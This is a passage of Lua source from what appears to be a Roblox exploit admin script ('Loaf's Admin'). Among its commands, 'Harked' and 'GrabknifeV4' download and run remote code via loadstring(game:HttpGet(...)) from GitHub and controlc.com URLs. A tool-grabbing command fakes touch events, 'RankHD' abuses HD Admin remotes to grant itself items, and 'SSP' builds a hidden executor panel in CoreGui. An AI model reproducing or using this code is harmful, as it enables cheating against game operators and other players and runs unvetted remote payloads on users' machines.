                                        DoDamage(hum,10)
                                end
                        end)
                        ctween(ls,"C0",ls0 * CFrame.new(1,.2,-1) * CFrame.Angles(math.rad(115),math.rad(0),math.rad(40)) * CFrame.Angles(0,math.rad(60),0),6,true)
                        ctween(rs,"C0",rs0*CFrame.new(0,0,-.3) * CFrame.Angles(math.rad(120),math.rad(80),math.rad(-30))* CFrame.Angles(math.rad(-50),0,0),6,true)
                        wait(.1)
                        bg.cframe = char.Torso.CFrame * CFrame.Angles(0,math.rad(40),0)
                        hitcon:disconnect()
                elseif basiccombo == 2 then
                        ctween(ls,"C0",ls0*CFrame.new(1,0,-1) * CFrame.Angles(math.rad(5),math.rad(0),math.rad(70)),10,true)
                        ctween(grip,"C0",grip0*CFrame.Angles(math.rad(10),0,0),12,true)
                        ctween(rs,"C0",rs0*CFrame.new(0,0,0) * CFrame.Angles(math.rad(-5),math.rad(0),math.rad(0)),10,true)
                        wait(.2)
                        playSound(92597296,hamend,1,.7)
                        wait(.1)
                        bg.maxTorque = Vector3.new(1,1,1)*9e10
                        bg.cframe = char.Torso.CFrame
                        bv.maxForce = Vector3.new(1,0,1)*9e5
                        bv.velocity = bg.cframe.lookVector * 70
                        coroutine.wrap(function() for i=1,25 do bv.velocity = bv.velocity*.9 wait(1/30) end bv.maxForce = Vector3.new() end)()
                        local thrustcon
                        thrustcon = hamend.Touched:connect(function(hit)
                                if not hit.Anchored then
                                        hit.Velocity = hit.Velocity + hamend.CFrame.lookVector*-40
                                end
                                local hum = hit.Parent:FindFirstChild("Humanoid")
                                if hum and not hum:IsDescendantOf(char) then
                                        DoDamage(hum,5)
                                        --thrustcon:disconnect()
                                        hum.Sit = true
                                        ctween(grip,"C0",grip0*CFrame.Angles(math.rad(30),0,0),5,true)
                                        if not ac then ac = playSound(92597296,hamend,1,1.15) end
                                        local tor = hum.Parent:FindFirstChild("Torso")
                                        if tor and not tor:FindFirstChild("torv") then
                                                --tor.Velocity = bg.cframe.lookVector*30 + Vector3.new(0,100,0)
                                                local torv = Instance.new("BodyVelocity",tor)
                                                torv.maxForce = Vector3.new(1,1,1)*9e9
                                                torv.P = 2000
                                                torv.velocity = bg.cframe.lookVector*20 + Vector3.new(0,120,0)
                                                torv.Name = "torv"
                                                local torav = Instance.new("BodyAngularVelocity",tor)
                                                torav.maxTorque = Vector3.new(1,1,1)*9e9
                                                torav.P = 5000
                                                torav.angularvelocity = Vector3.new(math.random()-.5,math.random()-.5,math.random()-.5)*2
                                                coroutine.wrap(function() 
                                                        for i=1,torv.velocity.Y/196.22*30 do
                                                                hum.Sit = true
                                                                torv.velocity = torv.velocity - Vector3.new(0,196.22/30,0) 
                                                                wait(1/30) 
                                                        end 
                                                        torv:Destroy() 
                                                        torav:Destroy()
                                                        tor.Velocity = Vector3.new()
                                                end)()
                                        end
                                end
                        end)
                        ctween(ls,"C0",ls0*CFrame.new(1,0,-1) * CFrame.Angles(math.rad(80),math.rad(0),math.rad(50)),12,true)
                        ctween(grip,"C0",grip0*CFrame.Angles(math.rad(-70),0,0),12,true)
                        ctween(rs,"C0",rs0*CFrame.new(-.6,0,-.7) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(-10)),12,true)
                        Delay(.3,function() thrustcon:disconnect() end)
                        
                end
                wait(.1)
                bg.maxTorque = Vector3.new(1,0,1)*9e10
                
                basiccombotimer = tick()
                atdeb = false
                idling = true
                
        end -- 96626016, 92597296
        bg.cframe = CFrame.new(char.Torso.Position,char.Torso.Position+char.Torso.CFrame.lookVector*Vector3.new(1,0,1))
end))

char.Humanoid.MaxHealth = 220
char.Humanoid.WalkSpeed = 20
wait(.3)
char.Humanoid.Health = 220
end)
AddCmd('Gun','',function()

local Handles = {
    CFrame.new(0, -1, 0),
    CFrame.new(0, 0, 0),
    CFrame.new(0, -1, 1),
    CFrame.new(0, -1, 2),
    CFrame.new(0, -1, 2),
        CFrame.new(0, -1, 2),
    
}

for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if i <= #Handles+1 and i>=2 then


v.Grip = Handles[i-1] 
v.Parent = game.Players.LocalPlayer.Character
end
end 

end)
AddCmd('Harked','',function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/loliskind33/er2r/main/h",true))()
end)
AddCmd('GrabknifeV4','',function()
loadstring(game:HttpGet("https://controlc.com/c78a1b60/",true))()
end)
AddCmd('grabknifev4','',function()
loadstring(game:HttpGet("https://controlc.com/c78a1b60/",true))()
end)
AddCmd('getalltools','',function()
for _,v in pairs(workspace:GetDescendants()) do
if v:IsA("TouchTransmitter") and v:IsA("Tool") then
firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 0) --0 is touch
wait()
firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 1) -- 1 is untouch
end
end
end)
AddCmd('Getalltools','',function()
for i,v in pairs(game:GetDescendants()) do
if v:IsA("HooperBin") or v:IsA("Tool") then

v.Parent = game.Players.LocalPlayer.Backpack
end
end
end)
AddCmd('InsertHD','',function()
game.StarterGui:SetCore("SendNotification", {
Title = "Loaf's Admin"; -- the title (ofc)
Text = "Inserted HD - Finished!"; -- what the text says (ofc)
Icon = "rbxassetid://1204881901"; -- the image if u want. 
Duration = 5; -- how long the notification should in secounds
})
end)
AddCmd('RankHD','',function()
local plr = game.Players.LocalPlayer
local old = plr.Character.HumanoidRootPart.CFrame

plr.Character.HumanoidRootPart.CFrame = CFrame.new(-855.818298, 135.992508, -989.038208, -1.1920929e-07, 0, 1.00000012, 0, 1, 0, -1.00000012, 0, -1.1920929e-07) -- where you teleport
wait(0.00)
plr.Character.HumanoidRootPart.CFrame = old -- teleports you back to your old position
wait(0.1)
game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(":r6 me")
wait(0.1)
game.ReplicatedStorage.HDAdminClient.Signals.RequestCommand:InvokeServer(":give me b")
end)
AddCmd('Chair','',function()
local Handles = {
CFrame.new(0.5, 3.5, -2.5),
CFrame.new(2, 2.5, -2),
CFrame.new(2, 2.5, -2.5),
CFrame.new(2.5, 2.5, -2),
CFrame.new(2.5, 2.5, -0.5),
CFrame.new(0.5, 1.5, -2.5),
CFrame.new(1, 2.5, -2),
CFrame.new(1, 2.5, -0.5),
CFrame.new(0.5, 2.5, -2),
CFrame.new(2, 0.5, -2.5),
CFrame.new(0.5, 3.5, -0.5),
CFrame.new(1.5, 2.5, -1),
CFrame.new(1, 1.5, -2.5),
CFrame.new(2.5, 2.5, -1),
CFrame.new(2.5, 2.5, -1.5),
CFrame.new(0.5, 0.5, -2.5),
CFrame.new(1, 0.5, -2.5),
CFrame.new(2, 2.5, -0.5),
CFrame.new(1, 2.5, -1),
CFrame.new(0.5, 2.5, -1.5),
CFrame.new(2, 2.5, -1),
CFrame.new(1.5, 2.5, -1.5),
CFrame.new(0.5, 2.5, -1),
CFrame.new(1.5, 0.5, -2.5),
CFrame.new(1.5, 2.5, -2),
CFrame.new(2, 2.5, -1.5),
CFrame.new(2.5, 1.5, -2.5),
CFrame.new(1.5, 2.5, -0.5),
CFrame.new(0.5, 2.5, -0.5),
CFrame.new(2.5, 3.5, -2.5),
CFrame.new(2.5, 0.5, -2.5),
CFrame.new(2.5, 3.5, -0.5),
CFrame.new(0.5, 2.5, -2.5),
CFrame.new(1.5, 2.5, -2.5),
CFrame.new(2, 1.5, -2.5),
CFrame.new(1, 2.5, -2.5),
CFrame.new(1.5, 1.5, -2.5),
CFrame.new(2.5, 2.5, -2.5),
CFrame.new(1, 2.5, -1.5),





}

for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if i <= #Handles+1 and i>=2 then
v.Grip = Handles[i-1]
v.Parent = game.Players.LocalPlayer.Character
v.Handle.CanCollide = false
end
end 
end)
AddCmd('Hammer','',function()
--[[
--Keybinds--
F - Slash
R - OverHead
L - Slash2
]]--

local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

bind = "f" -- has to be lowercase
bind2 = "r"
bind3 = "l"
mouse.KeyDown:connect(function(key)
if key == bind then
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://94161088"
local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(anim)
k:Play()
repeat task.wait() until not game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
k:Stop()
anim:Destroy()
end
end)
--2TH KEYBIND--

mouse.KeyDown:connect(function(key)
if key == bind2 then
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://94160738"
local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(anim)
k:Play()
repeat task.wait() until not game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
k:Stop()
anim:Destroy()
end
end)
--3TH KEYBIND--

mouse.KeyDown:connect(function(key)
if key == bind3 then
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://94161333"
local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(anim)
k:Play()
repeat task.wait() until not game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
k:Stop()
anim:Destroy()
end
end)

local Handles = {
CFrame.new(-2, -6.8000030517578125, 1.999999761581421),
CFrame.new(1.0000001192092896, -4.400008678436279, 2),
CFrame.new(-1.3113415775478643e-07, -3.4000086784362793, -3),
CFrame.new(2, -4.400008678436279, 2),
CFrame.new(-0.9999999403953552, -6.8000030517578125, 0.9999998807907104),
CFrame.new(-2, -5.600006103515625, -1.0000001192092896),
CFrame.new(2, -6.8000030517578125, 0.9999998807907104),
CFrame.new(-0.9999998807907104, -3.4000086784362793, 3),
CFrame.new(1, -3.4000091552734375, 5.2453366095051024e-08),
CFrame.new(-8.742278367890322e-08, -6.8000030517578125, -2.000000238418579),
CFrame.new(0.9999999403953552, -3.4000086784362793, -0.9999999403953552),
CFrame.new(0.9999999403953552, -5.600006103515625, -2),
CFrame.new(2, -5.600006103515625, -2),
CFrame.new(-8.74227694680485e-08, -3.4000086784362793, -1.9999998807907104),
CFrame.new(-2, -6.8000030517578125, -4),
CFrame.new(-1.999999761581421, -5.600006103515625, 4),
CFrame.new(2, -4.400008678436279, -4),
CFrame.new(-2, -5.600006103515625, -5.2453721366418904e-08),
CFrame.new(-0.9999999403953552, -3.4000086784362793, 2),
CFrame.new(2, -3.4000091552734375, 1.0000001192092896),
CFrame.new(0.9999999403953552, -4.400008678436279, -1),
CFrame.new(1.0000001192092896, -4.400008678436279, 3),
CFrame.new(-0.5, -2.200010299682617, 2.2292768164788868e-07),
CFrame.new(-0.9999998211860657, -6.8000030517578125, 3.999999761581421),
CFrame.new(2, -6.8000030517578125, -1.5736077330075204e-07),
CFrame.new(-1, -3.4000086784362793, -0.9999998211860657),
CFrame.new(1, -5.600006103515625, 0.9999998211860657),
CFrame.new(8.742277657347586e-08, -5.600006103515625, 2),
CFrame.new(-2, -4.4000091552734375, 5.2453366095051024e-08),
CFrame.new(8.789135733230577e-15, -2.200010299682617, 2.0107198395180603e-07),
CFrame.new(-0.9999999403953552, -4.4000091552734375, 1),
CFrame.new(1.3113415775478643e-07, -6.8000030517578125, 2.999999761581421),
CFrame.new(1.7484555314695172e-07, -4.400008678436279, 4),
CFrame.new(-1.0000001192092896, -5.600006103515625, -4),
CFrame.new(-2, -3.4000091552734375, 1.3987613556309952e-07),
CFrame.new(-1.0000001192092896, -3.4000086784362793, -1.9999998807907104),
CFrame.new(-1.7484555314695172e-07, -4.400008678436279, -4),
CFrame.new(0.9999998211860657, -4.400008678436279, -4),
CFrame.new(1, -3.4000091552734375, 1.0000001192092896),
CFrame.new(-1, -6.8000030517578125, -1.000000238418579),
CFrame.new(-1, -4.4000091552734375, 5.2453366095051024e-08),
CFrame.new(1, -4.4000091552734375, -3.4969410478424834e-08),
CFrame.new(1.3113415775478643e-07, -4.400008678436279, 3),
CFrame.new(-2, -5.600006103515625, 0.9999999403953552),
CFrame.new(-1.999999761581421, -4.400008678436279, 4),
CFrame.new(4.371138118131057e-08, -6.8000030517578125, 0.9999998211860657),
CFrame.new(1, -5.600006103515625, -1.3987650504532212e-07),
CFrame.new(-1.999999761581421, -3.4000086784362793, 4),
CFrame.new(0.9999999403953552, -3.4000086784362793, -1.9999998807907104),
CFrame.new(1.0000001192092896, -6.8000030517578125, 2.999999761581421),
CFrame.new(1.7484555314695172e-07, -5.600006103515625, 4),
CFrame.new(2.000000238418579, -3.4000086784362793, 4),
CFrame.new(0.9999998211860657, -5.600006103515625, -4),
CFrame.new(-8.742277657347586e-08, -4.400008678436279, -2),
CFrame.new(1.0000001192092896, -5.600006103515625, 2),
CFrame.new(-0.9999999403953552, -4.400008678436279, 2),
CFrame.new(4.371139183945161e-08, -3.4000091552734375, 1.0000001192092896),
CFrame.new(-1, -3.4000091552734375, 1.3987613556309952e-07),
CFrame.new(2.000000238418579, -5.600006103515625, 4),
CFrame.new(-0.9999999403953552, -3.4000091552734375, 1.0000001192092896),
CFrame.new(2, -6.8000030517578125, -2.000000238418579),
CFrame.new(1, -6.8000030517578125, 0.9999997615814209),
CFrame.new(1.0000001192092896, -3.4000086784362793, 4),
CFrame.new(-1.9999998807907104, -6.8000030517578125, 2.999999761581421),
CFrame.new(1, -6.8000030517578125, -2.447835640850826e-07),
CFrame.new(1.0000001192092896, -3.4000086784362793, 3),
CFrame.new(1.0000001192092896, -3.4000086784362793, 2),
CFrame.new(1.0000001192092896, -6.8000030517578125, 3.999999761581421),
CFrame.new(-1, -5.600006103515625, -1.0000001192092896),
CFrame.new(2, -5.600006103515625, 0.9999999403953552),
CFrame.new(-1.0000001192092896, -5.600006103515625, -3),
CFrame.new(1.3374776445054543e-14, -1.0000112056732178, 3.0597922773267783e-07),
CFrame.new(-1.3113415775478643e-07, -4.400008678436279, -3),
CFrame.new(0.9999999403953552, -4.400008678436279, -2),
CFrame.new(1.3374776445054543e-14, -0.000011205673217773438, 3.0597922773267783e-07),
CFrame.new(-2, -6.8000030517578125, -1.5736077330075204e-07),
CFrame.new(2, -5.600006103515625, -3),
CFrame.new(0.9999998807907104, -4.400008678436279, -3),
CFrame.new(-4.3711398944878965e-08, -6.8000030517578125, -1.000000238418579),
CFrame.new(8.742277657347586e-08, -4.400008678436279, 2),
CFrame.new(-1, -5.600006103515625, -5.2453721366418904e-08),
CFrame.new(-2, -4.400008678436279, -3),
CFrame.new(-2.1855687037941607e-08, -2.200010299682617, -0.4999998211860657),
CFrame.new(-1.0000001192092896, -4.400008678436279, -3),
CFrame.new(-2, -6.8000030517578125, -1.000000238418579),
CFrame.new(2.1855701248796322e-08, -2.200010299682617, 0.5000001788139343),
CFrame.new(2, -6.8000030517578125, 2.999999761581421),
CFrame.new(2, -4.400008678436279, -3),
CFrame.new(1.74845538936097e-07, -6.8000030517578125, 3.999999761581421),
CFrame.new(-1.0000001192092896, -6.8000030517578125, -3.000000238418579),
CFrame.new(-1.0000001192092896, -6.8000030517578125, -4),
CFrame.new(0.9999999403953552, -6.8000030517578125, -1.000000238418579),
CFrame.new(-2, -3.4000086784362793, 2),
CFrame.new(-0.9999998807907104, -5.600006103515625, 3),
CFrame.new(-0.9999998211860657, -4.400008678436279, 4),
CFrame.new(-1.7484555314695172e-07, -6.8000030517578125, -4),
CFrame.new(4.203495021406611e-15, -3.4000091552734375, 9.616475438178895e-08),
CFrame.new(-0.9999998211860657, -5.600006103515625, 4),
CFrame.new(-1, -4.400008678436279, -0.9999999403953552),
CFrame.new(2, -4.400008678436279, -0.9999999403953552),
CFrame.new(2.000000238418579, -4.400008678436279, 4),
CFrame.new(2, -4.400008678436279, -2),
CFrame.new(4.371138828673793e-08, -4.4000091552734375, 1),
CFrame.new(-2, -5.600006103515625, -4),
CFrame.new(1.3113415775478643e-07, -5.600006103515625, 3),
CFrame.new(0.9999999403953552, -5.600006103515625, -1.0000001192092896),
CFrame.new(0.9999998807907104, -6.8000030517578125, -3.000000238418579),
CFrame.new(4.371138473402425e-08, -5.600006103515625, 0.9999998807907104),
CFrame.new(-0.9999999403953552, -5.600006103515625, 2),
CFrame.new(2, -6.8000030517578125, 1.999999761581421),
CFrame.new(-0.9999998807907104, -4.400008678436279, 3),
CFrame.new(-1.0000001192092896, -3.4000086784362793, -3),
CFrame.new(2, -5.600006103515625, 2),
CFrame.new(-1.7484555314695172e-07, -3.4000086784362793, -4),
CFrame.new(-0.9999999403953552, -5.600006103515625, 0.9999999403953552),
CFrame.new(-0.9999998807907104, -6.8000030517578125, 2.999999761581421),
CFrame.new(-1, -6.8000030517578125, -1.5736077330075204e-07),
CFrame.new(-4.371138828673793e-08, -4.400008678436279, -1),
CFrame.new(8.74227694680485e-08, -6.8000030517578125, 1.999999761581421),
CFrame.new(1.0000001192092896, -4.400008678436279, 4),
CFrame.new(-4.203510267999661e-15, -5.600006103515625, -9.616510965315683e-08),
CFrame.new(-2, -3.4000091552734375, 1.0000001192092896),
CFrame.new(-1.3113417196564114e-07, -6.8000030517578125, -3.000000238418579),
CFrame.new(-2, -4.400008678436279, 2),
CFrame.new(-1.0000001192092896, -4.400008678436279, -4),
CFrame.new(-4.371139183945161e-08, -5.600006103515625, -1.0000001192092896),
CFrame.new(2, -3.4000086784362793, -1.9999998807907104),
CFrame.new(-1.7484555314695172e-07, -5.600006103515625, -4),
CFrame.new(1.0000001192092896, -5.600006103515625, 4),
CFrame.new(-1.9999998807907104, -3.4000086784362793, 3),
CFrame.new(-1.0000001192092896, -3.4000086784362793, -4),
CFrame.new(2, -3.4000086784362793, 2),
CFrame.new(-2, -4.400008678436279, -0.9999999403953552),
CFrame.new(-8.742277657347586e-08, -5.600006103515625, -2),
CFrame.new(1.0000001192092896, -6.8000030517578125, 1.999999761581421),
CFrame.new(-1.0000001192092896, -6.8000030517578125, -2.000000238418579),
CFrame.new(2, -6.8000030517578125, -3.000000238418579),
CFrame.new(-2, -3.4000086784362793, -0.9999998211860657),
CFrame.new(1.7484555314695172e-07, -3.4000086784362793, 4),
CFrame.new(-1.9999998807907104, -4.400008678436279, 3),
CFrame.new(2, -4.400008678436279, 3),
CFrame.new(-2, -5.600006103515625, -2),
CFrame.new(-4.371138473402425e-08, -3.4000086784362793, -0.9999998807907104),
CFrame.new(3.8212398519808224e-16, -4.4000091552734375, 8.741977808313095e-09),
CFrame.new(0.9999999403953552, -6.8000030517578125, -2.000000238418579),
CFrame.new(1.3113415775478643e-07, -3.4000086784362793, 3),
CFrame.new(-2, -3.4000086784362793, -4),
CFrame.new(0.9999998211860657, -3.4000086784362793, -4),
CFrame.new(-1.3113415775478643e-07, -5.600006103515625, -3),
CFrame.new(-1.0000001192092896, -4.400008678436279, -2),
CFrame.new(-1.999999761581421, -6.8000030517578125, 3.999999761581421),
CFrame.new(0.5, -2.200010299682617, 1.792162862557234e-07),
CFrame.new(2.000000238418579, -6.8000030517578125, 3.999999761581421),
CFrame.new(-1.9999998807907104, -5.600006103515625, 3),
CFrame.new(-2, -5.600006103515625, 2),
CFrame.new(2, -3.4000086784362793, -3),
CFrame.new(0.9999998807907104, -3.4000086784362793, -3),
CFrame.new(-0.9999999403953552, -6.8000030517578125, 1.999999761581421),
CFrame.new(-2, -3.4000086784362793, -3),
CFrame.new(-2, -5.600006103515625, -3),
CFrame.new(-2, -4.400008678436279, -2),
CFrame.new(2, -3.4000091552734375, 1.3987613556309952e-07),
CFrame.new(0.9999998807907104, -5.600006103515625, -3),
CFrame.new(-2, -4.400008678436279, -4),
CFrame.new(1.0000001192092896, -5.600006103515625, 3),
CFrame.new(-0.9999998211860657, -3.4000086784362793, 4),
CFrame.new(-1.0000001192092896, -5.600006103515625, -2),
CFrame.new(8.742277657347586e-08, -3.4000086784362793, 2),
CFrame.new(2, -5.600006103515625, -4),
CFrame.new(-2, -6.8000030517578125, -2.000000238418579),
CFrame.new(-2, -3.4000086784362793, -1.9999998807907104),
CFrame.new(-2, -4.4000091552734375, 1),
CFrame.new(2, -6.8000030517578125, -1.000000238418579),
CFrame.new(2, -5.600006103515625, 3),
CFrame.new(-8.789143356527102e-15, -6.8000030517578125, -2.0107216869291733e-07),
CFrame.new(2, -3.4000086784362793, 3),
CFrame.new(2, -6.8000030517578125, -4),
CFrame.new(0.9999998211860657, -6.8000030517578125, -4),
CFrame.new(-2, -6.8000030517578125, 0.9999998807907104),
CFrame.new(2, -5.600006103515625, -5.2453721366418904e-08),
CFrame.new(1, -4.4000091552734375, 0.9999999403953552),
CFrame.new(-2, -6.8000030517578125, -3.000000238418579),
CFrame.new(2, -3.4000086784362793, -0.9999998211860657),
CFrame.new(2, -3.4000086784362793, -4),
CFrame.new(2, -4.4000091552734375, 5.2453366095051024e-08),
CFrame.new(2, -5.600006103515625, -1.0000001192092896),
CFrame.new(2, -4.4000091552734375, 1),







}

for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if i <= #Handles+1 and i>=2 then
v.Grip = Handles[i-1]
v.Parent = game.Players.LocalPlayer.Character
v.Handle.CanCollide = false
end
end 

for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
	
			if (v:IsA("Tool")) then
				
				v.Script:Destroy()
				
			end
end

end)
AddCmd('SSP','',function()
local SecrectServicePanelFoldr = Instance.new("Folder",game:GetService("ReplicatedStorage"))
SecrectServicePanelFoldr.Name = "SecrectServicePanel"
local Player = Instance.new("StringValue",game:GetService("ReplicatedStorage"):WaitForChild("SecrectServicePanel"))
Player.Name = "Player"
Player.Value = game:GetService("Players").LocalPlayer.Name

removething = function(name,parent) for i,v in pairs(parent:GetChildren()) do if v.Name == name then v:Destroy() end end end
removething("S3crectS4viceP1nel",game:GetService("CoreGui"))

local S3crectS4viceP1nel = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Packages = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local TextBox = Instance.new("TextBox")
local zoom_out = Instance.new("ImageButton")
local UIGridLayout = Instance.new("UIGridLayout")
local Example = Instance.new("TextButton")
local more_vert = Instance.new("ImageButton")
local NameLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local close = Instance.new("ImageButton")
local remove = Instance.new("ImageButton")
local Frame_2 = Instance.new("Frame")
local arrow_drop_up = Instance.new("ImageButton")
local arrow_drop_up_2 = Instance.new("ImageButton")
local TextLabel = Instance.new("TextLabel")
local navigate_next = Instance.new("ImageButton")
local AdminPanel = Instance.new("Frame")
local AdminFrame = Instance.new("Frame")
local ScrollingFrame_2 = Instance.new("ScrollingFrame")
local UIGridLayout_2 = Instance.new("UIGridLayout")
local ExampleCMD = Instance.new("TextButton")
local PlayersFrame = Instance.new("Frame")
local ScrollingFrame_3 = Instance.new("ScrollingFrame")
local UIGridLayout_3 = Instance.new("UIGridLayout")
local ExamplePlrs = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local refresh = Instance.new("ImageButton")
local Executor = Instance.new("Frame")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextBox_2 = Instance.new("TextBox")
local Frame_3 = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local Frame_4 = Instance.new("Frame")
local packages = Instance.new("TextButton")

--Properties:

S3crectS4viceP1nel.Name = "S3crectS4viceP1nel"
S3crectS4viceP1nel.Parent = game:GetService("CoreGui")
S3crectS4viceP1nel.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
S3crectS4viceP1nel.ResetOnSpawn = false

Frame.Parent = S3crectS4viceP1nel
Frame.BackgroundColor3 = Color3.fromRGB(59, 58, 59)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.628370464, 0, 0.529925168, 0)
Frame.Size = UDim2.new(0, 442, 0, 265)

Packages.Name = "Packages"
Packages.Parent = Frame
Packages.BackgroundColor3 = Color3.fromRGB(36, 35, 36)
Packages.BorderSizePixel = 0
Packages.Position = UDim2.new(0.211046755, 0, 0.150033444, 0)
Packages.Size = UDim2.new(0, 334, 0, 197)
Packages.Visible = false

ScrollingFrame.Parent = Packages
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(38, 37, 38)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.0269461069, 0, -3.09823122e-07, 0)
ScrollingFrame.Size = UDim2.new(0, 338, 0, 195)
ScrollingFrame.ScrollBarThickness = 0

TextBox.Parent = ScrollingFrame
TextBox.BackgroundColor3 = Color3.fromRGB(47, 46, 49)
TextBox.BorderSizePixel = 0
TextBox.LayoutOrder = -999
TextBox.Position = UDim2.new(-0.195084736, 0, -1.28571427, 0)
TextBox.Size = UDim2.new(0, 324, 0, 18)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
TextBox.PlaceholderText = "Search"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(178, 178, 178)
TextBox.TextSize = 14.000
TextBox.TextXAlignment = Enum.TextXAlignment.Left

zoom_out.Name = "zoom_out"
zoom_out.Parent = TextBox
zoom_out.BackgroundTransparency = 1.000
zoom_out.LayoutOrder = 7
zoom_out.Position = UDim2.new(0.897297323, 0, 0.191768795, 0)
zoom_out.Size = UDim2.new(0, 16, 0, 17)
zoom_out.ZIndex = 2
zoom_out.Image = "rbxassetid://3926307971"
zoom_out.ImageColor3 = Color3.fromRGB(178, 178, 178)
zoom_out.ImageRectOffset = Vector2.new(284, 164)
zoom_out.ImageRectSize = Vector2.new(36, 36)

UIGridLayout.Parent = ScrollingFrame
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellPadding = UDim2.new(0, 0, 0, 0)
UIGridLayout.CellSize = UDim2.new(0, 338, 0, 25)

Example.Name = "Example"
Example.Parent = SecrectServicePanelFoldr
Example.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
Example.BorderSizePixel = 0
Example.Position = UDim2.new(0.00834664889, 0, 0.139153346, 0)
Example.Size = UDim2.new(0, 338, 0, 25)
Example.Font = Enum.Font.SourceSans
Example.Text = "Example"
Example.TextColor3 = Color3.fromRGB(255, 255, 255)
Example.TextSize = 13.000
Example.TextXAlignment = Enum.TextXAlignment.Left

more_vert.Name = "more_vert"
more_vert.Parent = Example
more_vert.BackgroundTransparency = 1.000
more_vert.LayoutOrder = 9
more_vert.Position = UDim2.new(0.917309701, 0, 0.128279269, 0)
more_vert.Size = UDim2.new(0, 16, 0, 17)
more_vert.ZIndex = 2
more_vert.Image = "rbxassetid://3926305904"
more_vert.ImageRectOffset = Vector2.new(764, 764)
more_vert.ImageRectSize = Vector2.new(36, 36)

NameLabel.Name = "NameLabel"
NameLabel.Parent = Frame
NameLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NameLabel.BackgroundTransparency = 1.000
NameLabel.Size = UDim2.new(0, 121, 0, 15)
NameLabel.Font = Enum.Font.SourceSans
NameLabel.Text = " Secret Serivce Panel"
NameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
NameLabel.TextSize = 14.000
NameLabel.TextWrapped = true
NameLabel.TextXAlignment = Enum.TextXAlignment.Left

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.002358553, 0, 0.0630111992, 0)
TextButton.Size = UDim2.new(0, 213, 0, 22)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Executor"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 14.000

close.Name = "close"
close.Parent = Frame
close.BackgroundTransparency = 1.000
close.Position = UDim2.new(0.955525577, 0, -0.00276563875, 0)
close.Size = UDim2.new(0, 16, 0, 17)
close.ZIndex = 2
close.Image = "rbxassetid://3926305904"
close.ImageRectOffset = Vector2.new(284, 4)
close.ImageRectSize = Vector2.new(24, 24)

remove.Name = "remove"
remove.Parent = Frame
remove.BackgroundTransparency = 1.000
remove.LayoutOrder = 6
remove.Position = UDim2.new(0.912398934, 0, -0.00218338333, 0)
remove.Size = UDim2.new(0, 16, 0, 17)
remove.ZIndex = 2
remove.Image = "rbxassetid://3926307971"
remove.ImageRectOffset = Vector2.new(884, 284)
remove.ImageRectSize = Vector2.new(36, 36)

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(48, 46, 49)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.961906016, 0, 0.148312107, 0)
Frame_2.Size = UDim2.new(0, 16, 0, 196)

arrow_drop_up.Name = "arrow_drop_up"
arrow_drop_up.Parent = Frame_2
arrow_drop_up.BackgroundTransparency = 1.000
arrow_drop_up.LayoutOrder = 8
arrow_drop_up.Position = UDim2.new(0, 0, 0.00291936332, 0)
arrow_drop_up.Size = UDim2.new(0, 16, 0, 17)
arrow_drop_up.ZIndex = 2
arrow_drop_up.Image = "rbxassetid://3926307971"
arrow_drop_up.ImageRectOffset = Vector2.new(164, 484)
arrow_drop_up.ImageRectSize = Vector2.new(36, 36)

arrow_drop_up_2.Name = "arrow_drop_up"
arrow_drop_up_2.Parent = Frame_2
arrow_drop_up_2.BackgroundTransparency = 1.000
arrow_drop_up_2.LayoutOrder = 8
arrow_drop_up_2.Position = UDim2.new(0, 0, 0.918412328, 0)
arrow_drop_up_2.Rotation = 180.000
arrow_drop_up_2.Size = UDim2.new(0, 16, 0, 17)
arrow_drop_up_2.ZIndex = 2
arrow_drop_up_2.Image = "rbxassetid://3926307971"
arrow_drop_up_2.ImageRectOffset = Vector2.new(164, 484)
arrow_drop_up_2.ImageRectSize = Vector2.new(36, 36)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(56, 55, 58)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0520361997, 0, 0.905660391, 0)
